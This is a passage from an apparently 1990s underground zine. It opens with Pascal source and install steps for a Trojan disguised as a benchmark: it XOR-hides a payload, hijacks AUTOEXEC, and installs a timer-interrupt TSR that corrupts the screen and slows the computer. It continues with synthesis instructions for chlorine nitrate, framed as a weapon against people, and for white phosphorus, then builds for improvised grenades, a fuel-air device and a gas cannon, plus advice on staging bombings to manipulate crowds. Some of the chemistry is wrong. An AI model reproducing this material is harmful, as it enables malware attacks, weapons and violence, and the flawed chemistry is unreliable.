 read(f1,a);
 a:=a XOR $AB;
 write(f2,a);
 end;
 gettime(h,m,s,hs);
 gotoxy(1,9);
 writeln('Stop Time: ',h,':',m,':',s,':',hs);
close(f2);
close(f1);
setfattr(f2,$2); {Make file hidden}
writeln('Whetstone Performance Test complete');
Writeln('-----------------------------------');
writeln('The results are based on memory, cpu, & hard drive access times');
writeln('This file is donated to the public domain');
end.

Now, in order to be a little subtle, we used a very simple encryption of our 
TSR Trojan, mainly XORing it with $AB.  We will have a small encryptor that 
will place our executable TSR Trojan into the encrypted format for use with 
our TESTER.EXE infector. ENCRYPT.PAS:

var f1,f2:file of byte;
    a:byte;
begin
assign(f1,'TROJAN.EXE');
assign(f2,'TESTER.DTA');
reset(f1);
rewrite(f2);
while not eof(f1) do begin
 read(f1,a);
 a:=a XOR $AB;
 write(f2,a);
 end;
close(f1);
close(f2);
end.

Ok, we have finished. all we need now is our TSR Trojan! If you want to test 
this out already, just cut those two programs out to .PAS source and compile 
them with TP. Make a Trojan.pas file of:
Begin
writeln('Its a Trojan. NOT!');
end.

Now compile that. then run the encryptor program first (2nd one here) which 
will create for you a TESTER.DTA file. Then run TESTER.  Reboot, and you 
should see everything happen the same, except you'll see 'Its a Trojan. NOT!' 
pop up before your autoexec.bat starts (after config.sys ends).  To go back 
to your normal state, copy back a normal Command.Com (or hex edit 
TRADEXEC.BAT back to AUTOEXEC.BAT), and if you want unhide TRADEXEC.BAT and 
MSDOSIO.EXE and delete them.  We have a fully working implanter.  From here 
you can use your imagination! I will show you here a nice TSR trojan to begin 
with, it'll get on the person's nerves.

 For the TSR, we are going to just hook interrupt $1C. This is the timer-tick 
interrupt.  This means that 19.2 times a second, we can do whatever we want. 
Now, we don't want to be destructive here, just piss the people off.  And 
screwing up their computer 19.2 times a second is a good way to do it. To 
start with, we will just have some minor, subtle annoyances. These are the 
kind of things that will piss them off slowly to suicide, but not enough that 
they have to sit there forever figuring out what's wrong. To do this, we are 
going to slowly modify their text screen & sporadically slow their computer 
down.
TROJAN.PAS:

{$M 1024,0,1024} {Keep memory usage low}

Uses Dos;

Var
 count:integer;
 place:word;
 letter:byte;
 pause,p:word;
 which:word;

Procedure FuckSpeed;

Interrupt;
Begin
 count:=count+10;
 for p:=1 to count do
 pause:=0;
 repeat
  pause:=pause+1;
 until pause=65000;
 if count>30000 then count:=0;
end;

Procedure FuckYourScreen;
Interrupt;
Begin
 inc(count);  {Increment the count variable by 1}
 if count>192 then begin
      letter:=mem[$B800:place*2]; {get a character on the screen, the location
				   is found by taking place*2 DIV 25 for
				   which row and place*2 MOD 25 for which
				   character position}
      if (letter>64) AND (letter<121) then
	  mem[$B800:place*2]:=letter+1; {if it is a letter there then 
					 put a new letter that is one
					 greater there}
     count:=0; {reset the timer}
     inc(place); {increment screen location looker}
  end;
 end;

Begin
 count:=0;
 place:=0;
 randomize;
 which:=random(4);
 case which of
 0: setintvec($1C,@FuckYourScreen); {Put the procedure in the ticker}
 1: setintvec($1C,@FuckSpeed);
 else halt(0);
 end;
 keep(0);                        {Remain resident}
End.                             {That's All Folks}

That's it, call it trojan.pas, and compile it.  Now, 50% of the time it will 
do nothing, no resident or anything.  25% of the time it will FuckYourScreen. 
Now, to adjust the rate it fucksyourscreen, change the line that reads if 
count>192, where 192 is the speed. 192 means it will look for a letter every 
10 seconds. if the current position it is searching is a character, it 
increments the character on the screen, otherwise it does nothing. Something 
like 19 there will speed through fucking your screen. You don't want to 
destroy their computer remember, just fuck it up. Something that will drive 
them insane without actually affecting their use. The other 25% it fuckspeed. 
It will slow your computer down, and then speed up.  The settings here are if 
count>30000 then count:=0 and count:=count+1. If you want it always to be 
slow, change the count:=0 part to a higher number, and if you want it to get 
slower, change the count>30000 to higher (up to 65000). And if you want it to 
alternate speeds more rapidly, change count:=count+1 to +10, or +100, or 
whatever.

After you are done, to review, in the following order:
compile TROJAN.PAS
compile ENCRYPT.PAS
compile TESTER.PAS
run ENCRYPT.PAS
run TESTER.PAS
reboot. 
Infection complete.

Note: no error-checking is performed here, so put it in yourself if you
care.

Additional note: Pull out the CTTY NUL and CON from the batch file and the 
source code if you are using a trojan that has no output.  If you wanted to 
run a trojan that would say something like "fuck you" keep these lines in the

\\------------------------------------------------------------------------//
Skill Level: 5  (extreme skill nessecary)

This month's column is not some little thing you can do with your little 
chemistry set your mom bought you in third grade.  This is also not for those 
of you who just want to dabble around in your first chemistry experiment.  
This is the BIG time.  This is the explosive DEMONS are made of!  This is the 
stuff the army would LOVE to use, but the geneva convention prevents it!  Yes, 
you can break the geneva convention in your own basement.  I don't advise you 
EVER try this unless you have a VAST amount of knowledge about chemistry.  I 
don't even advise you try this if you are a college graduate.  I advise that 
you have an EXTENSIVE KNOWLEDGE OF CHEMISTRY BEFORE TRYING THIS!  I TAKE NO 
RESPONSIBILITY FOR YOUR DEATH!

Ok..  for those of you who dare to read on.  The first thing you will need is 
Hydrofloric Acid.  This is not so easy to obtain.  Your best bet is to call 
around.  Many chemical supply houses may carry this stuff.  The best place to 
get this stuff is some sort of glass works factory or shop.  HF is used to 
etch glass.  SO BE CAREFUL!  DON'T TOUCH!  Don't even THINK about touching it!  
If you pour this stuff through any glassware, you will lose a limb.
Now you need a chlorine gas generator.  Not to hard to come by, Simply mix 
bleach and ammonia in a bottle with a tube leading out.  Ok.. here goes..

Now, take a tube of fluoride toothpaste.  Spread this toothpaste over a coffee 
filter.  Now, gently run cold water over this filter, and collect the water 
that is filtered through.  Continue to do this until you've gone through about 
2 tubes of toothpaste.  Now refilter the water about 10 times.  When you have 
the final product, boil it off, and collect the crystals that will form at the 
bottom of the glass.  You will need these for the next step.

Ok.. now build a copper electrolysis apparatus from some copper tubing bought 
at your local hardware store.  Gently treat the inside of the apparatus with 
the Hydrofloric acid.  This will prevent the reaction of fluorine with the 
inside of the APPARATUS.  As you will find, FLUORINE is a VERY reactive 
substance.  Do not allow it to contact water, for it will reform Hydrofloric 
acid.  DO NOT BREATH, OR ALLOW CONTACT WITH SKIN!  Ok, the cathode must be 
made of copper, while the anode should be made of PURE CARBON!  No graphite.

Ok, begin running this apparatus with a car battery for power.  be careful, it 
can get pretty hot in there.  From the cathode you should begin getting 
FLUORINE.  Now run this gas over the crystals from the toothpaste.  These 
crystals are Sodium FLUORIDE.  This will draw out any HF that may have 
accidentally been released from solution.  This will make it possible for you 
to save the FLUORINE gas in glass apparatus without corrosion of the glass 
from impurities.  Now save this gas, and get ready for the next section.

Now, you will be making a gas known as Chlorinemonofloride.   Using this gas, 
you can create the final product.  Ok.. here goes.

Set up an APPARATUS to mix the chlorine gas with the FLUORINE gas while 
heating the mixture to a temperature above 220 C,  BUT DO NOT ALLOW THE 
TEMPERATURE TO EVER RAISE ABOVE 250C.  If it does, abort the EXPERIMENT, and 
start this step over.  Allow this to proceed for about 2 hours.  Ok..  here's 
the hard part.  You will now have the following chemicals.

ClF  - Chlorinemonofloride mp  -156.6C bp  -100.1C
ClF3 - Chlorinetrifloride  mp  -76.3C  bp   11.75C

They are produced by the following reaction at 230C.
Cl2 + 2F2 --> ClF + ClF3

Ok..  here goes.  Grab yourself some liquid nitrogen.  Bathe the gaseous 
mixture of the two chemicals in the liquid nitrogen.  Make sure the 
temperature stays between -140C and -110C.  Now some solid should form in the 
mixture.  Somehow pour the liquid out of the mixture, and collect it in a cold 
nitrogen bath.  Keep it in liquid form, and try not to breathe.  Don't worry, 
it gets worse.  Now take some nitric acid, and pour it in.  While the reaction 
goes to completion, allow it to warm up to a temperature no more than 15 
degrees celcius.  This reaction will reform Hydrofloric acid.  Be careful to 
add bits of copper shavings to keep the HF formed from eating the glass.  Now, 
by diffractional distillation, raise the temperature of the mix to above 24C.  
Now condense the gas to a liquid form, and keep it in a flask with a SYNTHETIC 
RUBBER STOPPER!

Keep it refridgerated, or it will revert to gaseous form.  Here's what you 
have just made..

ClONO2 - Chlorine Nitrate bp 22.3C

here's the formation reaction:
ClF + HNO3 --> ClONO2 + HF

Now you have it!  What do you do with it?

Ok.. here's what makes this stuff special.  This isn't just some other 
explosive liquid like nitroglycerine.  As a matter of fact, it's less powerful 
than an equal amount of nitro.  Then WHY would anyone put themselves through 
all this hell of making it?  Simple..  It's SPECIAL!

You see, by itself,  It is NOT an explosive.  As a matter of fact, you can 
light it, heat it up, hit it with a hammer, and even detonate it, and it will 
HAVE NO EFFECT!  Why is it useful then?

It reacts explosively with organic matter!  Huh?  Yepper!  Pour this stuff on 
wood, skin, or other organic materials, and you can expect the greatest 
explosion of your LIFE!  It's not that it blows up huge, but the way you set 
it off.  You can store this stuff around, and then pour it on your friends and 
watch as thier SKIN EXPLODES!  Not the liquid, the liquid makes thier BODY 
EXPLODE.  This is one NASTY substance. Imagine the napalm you could create out 
of this!


Well, I hope you enjoyed this article, and if you attempt to make any, I wish 
you the best of luck.

			      -CHEMISTRY CORNER-
			   =How to make Phosphorus=

OK..  first, I'm going to discuss some of phosphorus's chemical proporties, 
then I will delve into what it can be used for, and then of course, a complete 
step by step instruction on how to make it.

Phosphorus has 3 true froms (but actually it has hundreds of allotropes)
Those forms are...
White- A pure form of tetrahedral phosphorus P4.  It is white, and highly 
toxic, and it is the most reactive form.
Red- A less reactive form.  It is formed by the opening of the tetrahedral 
bonds to form polymer chains of P atoms.
Black- A planar form of red phosphorus.  It resembles graphite, and is the 
least reactive of all forms, nearly being stable at room temperature.

Yellow- Yellow phosphorus is commonly thought to be a "true" form of 
phosphorus, but it is really a mixture of white and red phosphorus due to the 
slow change of some white phosphorus into red.  Almost 97% of yellow 
phosphorus is white, so for most purposes is considered pure.

Phosphorus must be kept under water, or kerosene to avoid spontaneous 
combustion.  Phosphorus is so reactive in it's white form, that it will 
instantly combust with oxygen in the air.


Phosphorus is best known for it's use in WWI as a weapon, and is now outlawed 
by the geneva convention.  The heat generated from burning phosphorus is 
enough to melt steel. It was used in the war to MELT the barrels of large 
howitzers, but the "problem" was that some troops were burned BADLY by contact 
with it.  Big deal.. it's war, deal with it.

Phosphorus is also used in matches.  Just to bring you a fun fact..  I'll make 
you a bet.  I'll bet you don't know how a safety match works.  Think to 
yourself now..  ok.. now read on.  I'll safely bet that 99.44% of you DON'T 
know this...

A match is composed of a highly flammable compound, mixed with silicon 
dioxide.(sand)  The black strip on the matchbook is REALLY black phosphorus.  

Ok..  last chance, figure it out before you read on...  Nope?  Didn't think 
so.

When the match is rubbed against the black strip, there is a great deal of 
friction between the SiO2 in the match and the black strip.  Thus casuing the 
black strip to create SPARKS.  These sparks IN TURN ignite the flammable 
material in the match head.  

Toldja.

Phosphorus is used in many tracer bullets, and is especially used in 
incendiary devices due to the extreme heat generated by it's combustion.  



Ok.. you want to know how to make it..  right? ok.. i'll tell you.

First, if you are an animal rights activist, read no further.  

OK, now that we've gotten rid of those wienies.  Here's what U do.  Pick up 
your daddy's shotgun, and go kill some critters.  Munch down.  Now SAVE ALL 
THE BONES.  Take these bones, and crush them.  Grind the bones into a powder.  
Now bake them.  YES, BAKE them.  Actually, burn them.  Put em in the oven, and 
power up the heat, until the whole mess turns into pure carbon black.

Now the truth behind this is, this is NOT pure carbon.  As a matter of fact, 
it is VERY impure.  Containing a HIGH percentage of Calcium Phosphate.  

Now, before we go any further, I would like to stress a point.  
"Munch down"
I MEAN IT.  This is one of the few things I believe in.  I have NO 
compunctions about blowing the head clear off of an animal.  But mind you, I 
DO NOT AT ALL CONDONE the killing of animals solely for the purpose of making 
weaponry.  AT LEAST EAT THE DAMN THINGS.  Or find someone who will.  I don't 
care what your motivation for killing wildlife is, or even if you have a 
stupid licence.  If you kill it, EAT IT!

Anyways... Now go and get some sand.  Actually, if you can, pure silicon 
dioxide is preferred, but sand will do.

Now you need an airtight crucible (pyrex might be allright, but I've never 
used it myself.  A metal pipe can also be used.  NOT LEAD for you geniuses out 
there.

And a glass of water.  

Now, pack the crucible with a mixture of Silica and the carbon black.  Fill it 
about halfway.   The less you pack in, the less heat you need.

Now lead a glass tube from the AIRTIGHT (key word here) crucible to the BOTTOM 
of the glass of water.  Now drop that water into an ice bath, so it's nice and 
COLD.  REAL COLD.  BELOW 42' AT ALL TIMES!  preferably around 35'.

Ok, heat er up.  Use a BIG propane burner.  You need alot of heat here.
Eventually, the phosphorus will be released from the mixture as a vapor, which 
will be condensed back to a solid, PURE form in the water.  This will be white 
phosphorus.  To test this, take a SMALL SMALL amount out of the water with a 
LONG metal spoon.  It should ignite instantly.  If not.  Try again.  It worked 
for me on the first try...

Oh yeah..  If yer crucible isn't airtight, well,  you die.  The vaporized 
phosphorus will casue a cataclysmic air-fuel explosion that will easily blow 
you into small bits. SO TEST THE FUCKING CRUCIBLE FIRST!  

Anyways..  a VERY important point.  KEEP THIS STUFF UNDER WATER AT ALL TIMES!  
It is extremely dangerous.  Temperatures from burning phosphorus can range up 
to 3000 degrees F'.  Not only that, but it burns UNDER WATER!  Meaning, if you 
ignite it, and then drop it in the pool, it will continue burning under the 
water due to the trace amounts of oxygen in water.  If this stuff starts up, a 
class B fire extinguisher may be your only hope, but NO GUARANTEE.  Be 
forewarned, you are playing with fire here..  literally.  Caution is highly 
advised.  Unless you want to die young, DON'T fuck with this shit.  And don't 
drink the water, Phosphorus is a highly deadly toxin which acts primarily on 
the jaw.  If this stuff sees air, hit the deck.


Well..  thanx, and as always, 

The LIVE chemist, is the cautious one.  You can NEVER be too careful with 
explosives!

How to rally support for a revolt.

This month we will be discussing the following:
How to form underground support.
How to form minor support.
How to set up, and run a mass rally.
And as a bonus this month we will be explaining basic bombardment tactics.

Ok, now you want to form underground support FIRST.  This is what needs to be 
done before anything else can be accomplished.  This means getting yourself a 
band of followers.  Generally we are talking about radicals, and 
revolutionaries.  The common citizen will almost never participate in this 
sort of thing.  Now this is somewhat easy.  Many times there will be radical 
groups in your area.  Go to one of thier meetings, and talk to a few, choice, 
influential people.  Tell them merely that you have a proposal that you would 
like to discuss with them at some private place.  Now you must convince these 
few people to take your side, and to follow you.  A good leader needs to be 
very charismatic.  Not just any geek can win a revolt.  90% of leadership is 
simply charisma.  You want to say what these people want to hear.  Now, if you 
can convince them of your goals, and plans, you can begin to raise the support 
of the underground.  Soon these people will spread your ideas to others and 
soon you will be in control of a large group of revolutionaries.

Now is the time to Come outside with your plans.  Bring yourself out of the 
closet per se.  What you do now is VERY important.  Not just any fool can 
successfully accomplish this feat.  You will need to do something drastic, 
that the people will naturally dislike, but in the corner of thier minds agree 
with secretly.  Such as killing a rapist or murderer that went free on a 
technicality, or to bomb a corrupt politician.  Now after this happens, YOU 
must come out, and openly suggest that this was wrong.  "I agree with what has 
happened in theory, but it is unfortunate that anyone should have to die!" Now 
people will take a different view of you.  You now want to create yourself 
into the "HERO" status.  Plan another attack on a corrupt politician or 
something, but with you just barely saving the day.  Now naturally if you save 
a very important man, like the mayor or someone, there will be some sort of 
televised award ceremony, or some sort of public thanks for your deed of good.  
This is where you take your final stab at the souls of the people.  Refuse the 
award.  Then openly speak out against the politician RIGHT IN FRONT OF HIM.  
Say that you do not like him as a person, or as a leader, but you cannot 
condone the loss of human life.  If there is enough dissent against the 
politician in question, you have just achieved INSTANT hero status.  Now you 
can begin to spread your ideas.

Mass Rally.  This is where you had better shine.  You have GOT to be a master 
of charisma to pull this off.  YOU must be a GREAT public speaker.  You need 
to be able to inspire wrath in the people you speak to.
Organize yourself a HUGE pep-rally, or some sort of event where you will be 
speaking in front of thousands of people.  Such as a concert, or other public 
event.  Now prepare a nice little speech, talking about unimportant facts.  
After about 2-3 minutes of the speech, look up.  "I cannot claim as my own 
words, what others have written for me!  This is not my true being"  THIS is 
the keystone.  You MUST rally them.  Start talking about politics.  Speak out 
against corruption, and certain incumbents.  Now pick a fall group.  This is a 
group you can blame all of the problems in the current society on.  It should 
be a group that is widely disliked, and in the extreme minority.  An excellent 
fall group is the KKK.  LOTS of people hate them.  Now accuse the politicians 
of being in league with your fall group.  Begin to rally support to kick your 
leaders out of office.  Now depending on how things are going at this point, 
there are many things you can do.  If it is going VERY well, and you have them 
practically mesmerized.  Suggest that perhaps the system is old, and needs 
"renewing"  Speak about how with thier help, you can RENEW the system.  OMIT 
corruption, DESTROY evil!  If you get this far, you have them in the palm of 
your hand.  End your speech.  Make a few more mass rallies, each time hinting 
closer and closer at the idea of a revolt.  Then suddenly, BEGIN.  Many will 
turn away, but once you have convinced any group of people that they are being 
oppressed, they are yours to manipulate.  Nothing can stop you now.


BONUS ARTICLE: Bombardment

Ok, your target is ahead.  You cannot possibly walk in and take over.  The 
opinion of the citizens are against you, and the defence too strong.  You have 
no choice.  BOMB THE LIVING HELL OUT OF THEM!

Why?  Simple, not only are you breaking down key defences, but you are 
breaking down a thing that is INFINITELY more important.  MORALE.  You are 
crushing the morale of the people, and of the army.

HOW?  OK..  You will want to prepare rocket bombs,  such as the V2 that was 
used in germany against the british.  Use this to attack during the night.  
You will now prepare howitzers, and long range artillery.  Not just ANY 
artillery, POWERFUL ARTILLERY.  You want explosions, fires, napalm the whole 
bit.  You want to take out entire city blocks at a time, and turn the city 
into a veritable wasteland.  Then stop.  For about 2 days, do NOTHING.  They 
will begin to rebuild thier broken morale.  Now open fire for 48 hours 
STRAIGHT.  Don't stop until you have completely devastated them.  If you have 
planes available, bomb them.  CRUSH THEM.  Now when you strike, only sporadic 
movements of defence will attempt to stop you.

Next month: Jungle warfare, guerilla tactics.

Garbled User Presents...

		       _The Complete Budget Anarchist_

Welcome to hell..

This will now become a Regular feature of FBI Presents.

Oh yeah, that does bring up a point.  We are FBI.  This magazine is
"FBI Presents"  Everyone calls this thing FBI mag.  It not.  Get it?

What is this feature about?  Every issue (I've stopped saying month because 
it's so damn pointless) we will bring you a selection of anarchy for those of 
you on a budget.  We will present explosives for the following budgets...
Under $2, Between $2 and $5, Between $5 and $10, Between $10 and $20, and 
Between $20 and $40.  So, here we go.

Under $2
--------
The Mexican Firecracker

Price- Free-$0.99

What you need.  Matches, Tinfoil, Wick.

You can cut down the cost by theiving some matches, or asking for them at 
stores and Denny's.  Steal tinfoil from the kitchen.  And a wick can always be 
rigged up out of string.

Now here's the trick.  Simply look at the diagram.

-----------------------------------------------------------------------------
| /\    /\    /\    /\    /\    /\    /\    /\    /\    /\    /\    /\    / |

-----------------------------------------------------------------------------

Now take a SQUARE peice of aluminum foil.  Now fold it over, and over until 
you have a long strip, about 1.5 inches wide.  Now Put it on the table, and 
crease it with a book or something.  Now fold it along the lines up above.  
Folding each corner down, so it makes right triangles.  IF you were to 
continue folding it, it would make a right triangle when done.  But you 
won't.. yet.  Fold it 2 times, so it makes a little pocket.  Now cut off some 
match heads and stuff them in.  Powdering them makes it better, or using 
gunpowder, but that costs alot.  Now stuff the wick in the powder.   Continue 
folding the strip until it's a small triangle with a wick sticking out.

That's it.  Small, Effective, LOUD.  And cool looking too.  It's more of an 
effect thing, but it sure does pack a punch.    Here's the vital stats on it..

Kill Radius: None.
Maim Radius: None.
Intense Pain Radius: 1 foot.
Deafness Radius: 4 Feet.
Blast Radius: 8 inches.

Between $2 - $5
---------------
The Pocket Grenade

Price-$3.95

What you need: SMALL can of soup, Ground up match heads or gunpowder, wick.

The soup should be some liquid that can be drained out of a small hole without 
a problem.  Spagettios or similar pastas will not work.  A can of some sort of 
juice, about 6 ounzes is good. It must be a metal can. Now take a drill, or in 
some way make a hole about 1/4".  Now drain the liquid, and dry out the can.  
Use a funnel to fill the can with powder.  Now jam the wick in there.

Done.

Kill radius: 5 feet.
Maim radius: 15 feet.
Intense pain radius: 30 feet.
Deafness radius: 30 feet.
Blast radius: 3 feet.

Between $5 - $10
----------------
Pocket Rocket

Price-$10

What you need: Rocket engine, Match heads or gunpowder, solar ignitor, paper, 
a tube and nose cone, a 9" long pipe that is just barely larger than the tube, 
and an end cap for the pipe, a 9v and a SPST switch of some sort.

Hook the switch and the 9v to the electric ignitor.  Now drill a small hole in 
the end cap.  String the ignitor through the hole.  Now take the tube, and 
glue the nose cone on to the end.  Fill the tube with gunpowder.  Now glue the 
engine into the back.  Now the missile should only be a total of 8 inches in 
length, including the nose.  Slide the tube into the pipe, and fix the ignitor 
into the engine.  Screw on the cap.  Now to use it, simply draw the weapon, 
and activate the switch.  BE CAREFUL  a blast will come out of the hole, so 
point it away from your body.  Another way to build this is to place some 
gunpowder in the tube, and use a wick to ignite it.  It will be more powerful, 
but not as cool as the switch.  It CAN be re-used, but that requires a new 
ignitor and rocket.

Kill radius: 1 foot.
Maim radius: 2 feet.
Intense pain radius: 4 feet.
Deafness radius: 5 feet.
Blast radius: 2 feet.
Range: 400 feet.

Between $10 - $20
-----------------
Instant Fireball

Price: $11

What you need: A candle, and a propane tank.

Simple.  Turn on the propane, and leave a burning candle about 3-4 feet away.  
When the gas spreads, it will ignite and explode in a HUGE fireball.  The 
intense heat will burst the container, and throw shrapnel everywhere.  A VERY 
deadly Fuel/Air explosive.  The farther away the candle is, the longer the 
delay, but the greater the chance of failure, UNLESS it is in an enclosed 
area, such as a room with no ventilation.

Kill radius: 40 feet.
Maim radius: 60 feet.
Intense pain radius: 100 feet.
Deafness radius: 200 feet.
Blast radius: 30 feet.

Between $20 - $40
-----------------
The Obliviator Mark I

Price-$40

What you need: A long 2" ID PVC pipe, A tank of oxygen, A tank of propane, a Y 
valve, Some copper delivery tube, a majikap, a D battery, a battery holder, a 
SPST normally off pushbutton switch. (The cap, battery and button can be 
replaced by a sparker from a lighter, and an end cap.

A majicap is a small reusable detonator that is used in magic shows, and is 
available in most magic shops.  The Y valve should have two leads in, and one 
lead out, controlled by the valve.  This will mix the gasses.

Shells will be left to the user, they simply must fit tightly in the barrel of 
the gun.  Wrapping the shell in rubber or cling wrap will assure a tight fit.

Ok.  the gun is simple.  The pipe merely needs to have a hole drilled in to 
affix the Y valve.  Use duct tape to attach the tanks.  Using the copper tube 
to attach the tanks to the valve.  So when the valve is turned on, the 
propane/oxygen mixture will flow freely into the tube.  If the cap is used, 
attach the switch, and battery to it, and screw it into the end cap. If the 
sparker is used, simply affix the wires close to eachother inside the cap make 
sure a spark issues when the sparker is used.  Affix the end cap on to the 
tube.  A handle may be added if you wish, using the button as a trigger.

HOW to use your Mark I Obliviator.

Simply prepare your shell.  Turn the valve on and allow the fuel to enter 
freely.  When you feel the gun is full (a second or two) Stuff the projectile 
in the front, and turn off the valve.  Push the button and BOOM!

Kill radius: Depends on shell
Maim radius:         ''
Intense Pain Radius: ''
Deafness radius:     ''
Blast radius:        ''
Range: 400-1000 feet, depending on shell.


Thats all this month, look for 5 new ideas next issue.

Here I go again!  One more mindless editorial for you to despise me for ever

		       ANARCHY- Rational or irrational

By it's very definition, anarchy can be defined as an irrational state of 
thinking.  But deep in it's very roots, are the seeds of rational thought.  
Science every day is proving that there is order in chaos.  A certain logical 
pattern, to the way randomness behaves.  Could it be that anarchy in itself 
creates the seeds for greater human thought?

lets ponder this..

In a civilization as today, everthing is based on order.  Keeping order.  Laws 
to keep people following the same path as everyone else.  Making sure everyone 
follows a specific path to achieve a certain goal, and makes no deviation in 
the process.  But this in fact stifles the human mind.  Isn't it true, when 
given space, and the logical paths to react ot a certain situation, that if 
one were allowed to take ANY course of action he or she deems appropriate, 
that a more logical, or sensible answer will be found?  Of course in such a 
situation, many of the alternatives may turn out to be false.  But isn't that 
in fact a learning experience in itself?  When one fails, and anylizes the 
reasons that he failed, doesn't it give a person a more clear understanding of 
what he or she should do?  But instead, if you tell a person that there is 
only one way to solve a problem, He will become content in that one method.  
Whereas if you were to tell a person to simply solve the problem, in any way 
he deems appropriate, that he may in fact come up with a better, more accurate 
or simpler way to do so.  I will give an example.  A close freind of mine was 
given a phychological test.  In this test, he has a small clear box, with many 
little BB's in it.  His task was to get all the BB's to the outer edge of the 
box, by moving it around, and turning it in certain ways.  His solution was to 
spin the box on the table, and allow centrifugal force to pull the BBs into 
the outer edge.  This went against the norm.  Here, by violating normal laws 
of this puzzle, he was able to construct a more reasonable solution.  Isn't 
this a minor form of anarchy?  Breaking the rules of a conventional norm, to 
achieve the desired effect!

This is what I am trying to stress here.  That modern society puts our mind in 
a straight an narrow passageway.  Dissallowing it from creating a pathway of 
it's own.  If man is allowed to roam freely, free from any constrictive 
bounds, he or she can excell much quicker.  I have often found myself held 
back from higher learning simply because of my age.  I began learning college 
level chemistry, during my freshman year of high school.  But i was not 
allowed to study it, or even recieve help from teachers, or the school in 
doing so.  I was told to simply wait, like everyone else.  Here, by breaking 
the rules that confined me, If i were able to excel through the classes I was 
good at, and begin working on more complex ideas, that were at my level of 
thought, right now, I would be a much more educated person.  But if a person 
wants to accelerate himself beyond the NORMS of society, he is looked upon as 
a freak and shunned.  Modern society is built for the average citizen.  But 
the world isn't made up of average people.  We must learn to separate people 
by thier specialties, and learning aptitude.  Some people are below the 
average, and by pushing these people too hard, you will make it more difficult 
for them to learn things, whereas if you were to sit down, and slow things 
down to thier level, they would be able to comprehend things as equally as 
others.  On the opposite side, certain individuals have a greater learning 
speed, and by slowing these people down, you simply bore them, and they learn 
nothing.  If you were to speed up thier learnings, they would graduate into a 
higher state of mind.  What I am saying here.. Is traditional bounds BIND the 
mind, and stifle creativity.  When a child thinks of a new way to do 
something, often he is scolded by his teacher or mentor for trying to break 
the normal trend of things.  But by breaking free of this, and allowing the 
student to think freely, a new way may be learned, or at least a better 
understanding of the old ways.

Anarchy is much like this in many respects.  In anarchy, a total social 
breakdown is preferred to the normal line and stamp way of life.  By no longer 
constricting people to certain ways they will learn the true path they should 
follow.  Take rules of the road for example.  If suddenly, all speed limits, 
and traffic laws were null and void.  MANY people would abuse this, and get 
themselves killed.  But gradually, people will learn through thier 
experiences, and the experiences of others, WHY there are traffic laws, and 
WHY they should abide by them.  Still others may break them, but a greater 
understanding will come about, and more people will respond positively to the 
logic. By placing all responsibility upon oneself, one will suddenly become 
MORE responsible.  By showing by self experience WHY things are the way they 
are, people will become MORE responsive to the logical methods of doing 
things.  Yet still allow the freedom of choice, to strike out, and find a new 
way.

Anarchy means chaos.  And if this world should fall to anarchy, chaos will 
result.  For many years, this world will become a planet of death, and 
despair.  But eventually things will change, and a new way of seeing things 
will occur from this chaos.  And things will eventually work out towards the 
better end.

Order through chaos.  It's not such a far fetched idea.

     Unfortunately.. we have a few rules concerning articles submitted to us.

1) No disclaimer is nessecary, as a general disclaimer will be put at the end

following units.. or your article may not be accepted!

you readers.


     Also.. If you would like a subscription to our publication.. Simply send 
us a message saying so. We are non profit, and therefore we will mail a 
printed copy of the newsletter out(prior to national release, so YOU are one 
of the first to get the issue!) postage due. This may sound like we are 
cheap, but this way nobody gets cheated, and we get to remain anonymous.
